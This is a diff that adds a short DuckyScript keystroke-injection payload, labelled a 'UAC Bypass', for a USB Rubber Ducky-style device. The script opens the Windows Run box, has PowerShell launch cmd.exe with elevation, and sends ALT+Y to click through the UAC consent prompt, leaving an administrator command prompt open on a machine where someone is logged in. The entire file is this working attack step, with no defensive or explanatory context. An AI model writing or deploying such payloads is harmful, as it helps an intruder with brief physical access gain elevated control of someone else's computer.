@@ -1,0 +1,11 @@
+REM *** UAC Bypass, should work on any computer with admin rights. ***
+DELAY 2000
+WINDOWS r
+DELAY 200
+STRING powershell Start-Process cmd.exe -Verb runAs
+ENTER
+REM *** This delay lets slow/old computers execute the PowerShell properly ***
+DELAY 5000
+ALT y
+DELAY 500
+BACKSPACE
